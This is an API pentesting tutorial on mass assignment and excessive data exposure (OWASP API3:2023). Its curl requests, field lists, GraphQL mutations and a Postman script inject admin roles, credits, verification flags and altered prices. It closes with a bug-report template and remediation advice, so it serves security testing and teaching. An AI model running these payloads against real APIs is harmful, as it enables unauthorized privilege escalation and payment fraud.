# OWASP API3: Mass Assignment & Excessive Data Exposure
## Complete Study Notes — API Pentesting Day 10

> **Series:** 30-Day API Pentesting  
> **Day:** 10 — Week 2: OWASP API Top 10  
> **OWASP Category:** API3:2023 — Broken Object Property Level Authorization

---

## 🧠 Understanding the Core Concept First

Before jumping to attacks, you need to understand WHY this vulnerability exists.

### How Modern APIs Work (The Developer's Side)

When a developer builds an API, they create a **model** — think of it as a blueprint for a user object:

```
User Model in Database:
{
  id:            1002,
  email:         "john@example.com",
  password_hash: "$2b$12$abc...",
  role:          "user",
  is_admin:      false,
  credits:       100,
  plan:          "free",
  ssn:           "123-45-6789",
  created_at:    "2024-01-01"
}
```

**The problem:** Lazy/busy developers do one of two things:

1. **Return the ENTIRE model** in API responses — "the frontend will hide the sensitive fields"
2. **Bind the ENTIRE request body** to the model — "users can only send what they know about"

Both assumptions are **dead wrong**. You, as a hacker, can:
1. **Read** all fields in the API response (even if the frontend hides them)
2. **Write** any fields in the request body that you figure out exist

This is **Broken Object Property Level Authorization** — the server doesn't check which specific **properties** of an object a user is allowed to read or write.

---

## 📖 Two Types of the Same Bug

### Type 1: Excessive Data Exposure (READ side)
API returns more data than the user should see.

```
Developer thinks:  "I'll return everything, the mobile app only shows email & name"
Reality:           You intercept with Burp → see ALL fields → password_hash, SSN, etc.
```

### Type 2: Mass Assignment (WRITE side)
API accepts more data than the user should be able to modify.

```
Developer thinks:  "Users only know about email & name, so that's all they'll send"
Reality:           You discover field names from GET responses → inject them in POST
```

---

## 🔍 Step-by-Step Attack Methodology

### Phase 1: Reconnaissance — Find All Fields

```bash
# Step 1: GET your own profile — read ALL fields in the response
curl -H "Authorization: Bearer YOUR_TOKEN" \
  https://api.target.com/api/v1/users/me | python3 -m json.tool

# Response example — note EVERY field:
{
  "id": 1002,
  "email": "attacker@test.com",
  "name": "Test User",
  "role": "user",              ← INTERESTING
  "is_admin": false,           ← INTERESTING
  "verified": true,
  "plan": "free",              ← INTERESTING
  "credits": 100,              ← INTERESTING
  "account_type": "standard",  ← INTERESTING
  "subscription": "basic",     ← INTERESTING
  "created_at": "2024-01-01"
}

# Step 2: Also check OTHER endpoints for more field names
curl -H "Authorization: Bearer YOUR_TOKEN" \
  https://api.target.com/api/v1/orders | python3 -m json.tool

# Step 3: Check Swagger/OpenAPI spec for hidden fields
curl https://api.target.com/swagger.json | python3 -m json.tool | grep -A5 '"properties"'
```

### Phase 2: Test Excessive Data Exposure

```bash
# Check if sensitive fields appear in responses
curl -H "Authorization: Bearer YOUR_TOKEN" \
  https://api.target.com/api/v1/users/1 | python3 -m json.tool

# Red flags to look for in responses:
# password, password_hash, hashed_password
# ssn, social_security, national_id
# credit_card, card_number, cvv
# api_key, secret_key, private_key
# internal_notes, admin_notes
# balance, account_number, bank_*

# Pro tip: Check ALL endpoints, not just /users
# /orders, /invoices, /payments often leak financial data
```

### Phase 3: Mass Assignment Testing

```bash
# The Core Test:
# Take every "interesting" field from Phase 1
# Add them to your POST/PUT request body
# See if the server accepts them

# Test 1: Registration mass assignment
curl -X POST https://api.target.com/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@test.com",
    "password": "Test1234!",
    "name": "Test User",
    "role": "admin",
    "is_admin": true,
    "verified": true,
    "plan": "enterprise",
    "credits": 99999,
    "account_type": "premium",
    "subscription": "unlimited"
  }'

# After registering, check what fields were saved:
# GET /api/v1/users/me → did role change to "admin"?

# Test 2: Profile update mass assignment
curl -X PUT https://api.target.com/api/v1/users/me \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Updated Name",
    "role": "admin",
    "is_admin": true,
    "credits": 99999
  }'

# Test 3: Payment/order endpoint mass assignment
curl -X POST https://api.target.com/api/v1/orders \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "product_id": 1,
    "quantity": 1,
    "price": 0.01,
    "discount": 99,
    "final_price": 0.00,
    "status": "completed",
    "payment_status": "paid"
  }'
```

### Phase 4: Verify the Impact

```bash
# After each test, GET your profile to see what changed
curl -H "Authorization: Bearer YOUR_TOKEN" \
  https://api.target.com/api/v1/users/me

# Before attack:   {"role": "user",  "credits": 100}
# After attack:    {"role": "admin", "credits": 99999}
#                   ↑ VULNERABLE! Mass assignment worked!
```

---

## 🧪 All Fields to Always Test

```json
// Privilege escalation fields
"role": "admin"
"role": "superadmin"
"role": "moderator"
"is_admin": true
"admin": true
"superuser": true
"user_type": "admin"
"account_type": "admin"
"permissions": ["admin", "read", "write", "delete"]
"scope": "admin:full"
"access_level": 99

// Financial manipulation fields  
"credits": 99999
"balance": 99999
"wallet": 99999
"coins": 99999
"tokens": 99999
"points": 99999

// Account state manipulation
"verified": true
"email_verified": true
"phone_verified": true
"kyc_verified": true
"approved": true
"active": true
"suspended": false
"banned": false

// Subscription/plan manipulation
"plan": "enterprise"
"subscription": "unlimited"
"tier": "gold"
"membership": "premium"
"subscription_expires": "2099-12-31"
"trial_ends": "2099-12-31"

// Internal/debug fields
"internal": true
"debug": true
"beta": true
"staff": true
"employee": true
```

---

## 🔮 Advanced Techniques

### Technique 1: Nested Object Injection

```bash
# Some APIs use nested objects — try these formats:
curl -X PUT https://api.target.com/api/v1/profile \
  -d '{"user": {"role": "admin"}}'

curl -X PUT https://api.target.com/api/v1/profile \
  -d '{"profile": {"is_admin": true}}'

curl -X PUT https://api.target.com/api/v1/profile \
  -d '{"data": {"user": {"role": "admin"}}}'
```

### Technique 2: Different Content Types

```bash
# JSON blocked? Try form-data
curl -X POST https://api.target.com/api/v1/register \
  -F "email=attacker@test.com" \
  -F "password=Test1234!" \
  -F "role=admin" \
  -F "is_admin=true"

# Try XML if API accepts it
curl -X POST https://api.target.com/api/v1/register \
  -H "Content-Type: application/xml" \
  -d '<user><email>x@x.com</email><role>admin</role></user>'

# Try multipart/form-data
curl -X POST https://api.target.com/api/v1/profile \
  -H "Authorization: Bearer TOKEN" \
  --form "name=Test" \
  --form "role=admin" \
  --form "is_admin=true"
```

### Technique 3: HTTP Parameter Pollution

```bash
# Send the same parameter multiple times
curl -X POST https://api.target.com/api/v1/register \
  -d "email=x@x.com&password=Test1234!&role=user&role=admin"
# Which "role" does the server use? First? Last? Both?

# In JSON (some parsers use last value)
curl -X POST https://api.target.com/api/v1/register \
  -H "Content-Type: application/json" \
  -d '{"email":"x@x.com","role":"user","role":"admin"}'
```

### Technique 4: GraphQL Mass Assignment

```graphql
# First: Use introspection to find all input fields
{
  __type(name: "UpdateUserInput") {
    inputFields {
      name
      type { name }
    }
  }
}

# Then: Inject all discovered fields into mutation
mutation {
  updateUser(input: {
    name: "Test"
    role: "admin"
    isAdmin: true
    verified: true
    credits: 99999
    plan: "enterprise"
  }) {
    id
    role
    isAdmin
    credits
  }
}

# Also try updateProfile, createUser, registerUser mutations
```

### Technique 5: Read Error Messages for Field Names

```bash
# Send deliberately invalid values — error messages reveal field names!
curl -X POST https://api.target.com/api/v1/register \
  -d '{"email":"x@x.com","role":{"nested":"object"}}'

# Error: "role must be a string" → field 'role' exists and is accepted!

# Try unknown field name
curl -X POST https://api.target.com/api/v1/register \
  -d '{"email":"x@x.com","is_superadmin":true}'

# Error: "field 'is_superadmin' not allowed" → but 'is_admin' might work!
# No error at all → field silently accepted → check GET response
```

---

## 🎯 Real-World Attack Scenarios

### Scenario 1: Free User → Premium
```bash
# Register with subscription manipulation
curl -X POST /api/register \
  -d '{"email":"x@x.com","password":"P@ss!","subscription":"enterprise","credits":999}'
# Login and access premium features for free
```

### Scenario 2: Regular User → Admin
```bash
# Register with role escalation
curl -X POST /api/register \
  -d '{"email":"admin2@x.com","password":"P@ss!","role":"admin","is_admin":true}'
# Login → access admin panel → full application compromise
```

### Scenario 3: Bypass Email Verification
```bash
# Register without verifying email
curl -X POST /api/register \
  -d '{"email":"x@x.com","password":"P@ss!","email_verified":true,"verified":true}'
# Instantly verified account without clicking email link
```

### Scenario 4: Price Manipulation
```bash
# Create order with modified price
curl -X POST /api/orders \
  -H "Authorization: Bearer TOKEN" \
  -d '{"product_id":1,"quantity":1,"unit_price":0.01,"total":0.01}'
# Buy $100 product for $0.01
```

---

## 📊 Severity Assessment

| Finding | Severity |
|---------|----------|
| role: "admin" accepted → full admin access | Critical |
| credits/balance manipulation | High |
| Email verification bypass | High |
| Subscription plan escalation | High |
| SSN/card data in GET response | High |
| Password hash in GET response | High |
| is_admin: true accepted | Critical |
| Internal notes visible to user | Medium |

---

## 🔧 Postman Automation

```javascript
// Pre-request Script — auto-inject extra fields to every POST/PUT
var body = {};
try { body = JSON.parse(pm.request.body.raw); } catch(e) {}

// Inject privilege escalation fields
var extraFields = {
    "role": "admin",
    "is_admin": true,
    "verified": true,
    "plan": "enterprise",
    "credits": 99999
};
Object.assign(body, extraFields);
pm.request.body.update({ mode: 'raw', raw: JSON.stringify(body) });

// Tests tab — check if escalation worked
pm.test("Mass Assignment Check", function() {
    var data = pm.response.json();
    if (data.role === "admin" || data.is_admin === true) {
        console.log("🚨 MASS ASSIGNMENT FOUND! Role escalated to admin!");
    }
    if (data.credits > 1000) {
        console.log("🚨 MASS ASSIGNMENT FOUND! Credits manipulated: " + data.credits);
    }
});
```

---

## 📝 Bug Report Template

```
Title: Mass Assignment on POST /api/v1/register — Privilege Escalation to Admin

Severity: Critical

CVSS Score: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

Description:
The POST /api/v1/register endpoint is vulnerable to mass assignment, 
allowing any unauthenticated user to register an account with 
admin-level privileges by including the "role" and "is_admin" fields 
in the registration request body. The server blindly binds all 
incoming JSON properties to the user model without filtering 
privileged fields.

Steps to Reproduce:
1. Send the following request:
   POST /api/v1/register
   Content-Type: application/json
   
   {
     "email": "attacker@attacker.com",
     "password": "Test1234!",
     "name": "Attacker",
     "role": "admin",
     "is_admin": true
   }

2. Note the 201 Created response:
   {"id": 1337, "email": "attacker@attacker.com", "role": "admin"}

3. Login with the new credentials and access:
   GET /api/v1/admin/users → returns full user list (admin only endpoint)

Impact:
Any unauthenticated person on the internet can create an account 
with full admin privileges, gaining access to all admin functionality 
including user management, data export, and system configuration.

Remediation:
- Use an allowlist of permitted fields for each endpoint
- Never bind user input directly to database models
- Explicitly validate and filter all incoming fields
- Use separate DTOs (Data Transfer Objects) for input vs output
```

---

## ✅ Final Checklist

```
☐  GET /api/me — note EVERY field in the response, even "boring" ones
☐  GET /api/users/{id} — look for sensitive fields (hash, ssn, card)
☐  POST /register with role, is_admin, verified, credits, plan fields
☐  PUT /profile with same privilege escalation fields
☐  Check if field changes take effect with subsequent GET /me
☐  Test GraphQL mutations with all schema fields injected
☐  Try form-data and XML formats if JSON fields are filtered
☐  Read error messages carefully — they reveal valid field names
☐  Test financial endpoints — price, discount, total, status fields
☐  Document exact request/response pair for your report
```

---

## 💡 Key Takeaways

1. **GET before POST** — always read what the API returns before trying to write
2. **Every field is a target** — role, credits, plan, verified — try them all
3. **Error messages help** — "field not allowed" = you found a real field name
4. **Check the delta** — GET before attack + GET after = proof of exploitation
5. **GraphQL is extra vulnerable** — mutations often take any input field
6. **Content-type matters** — JSON filtered? form-data might work

> **Hunter mindset:** The server gave you the field names in the GET response. It told you the attack. You just have to listen.

---

*30-Day API Pentesting Series — @cybermindspace — follow for more.*
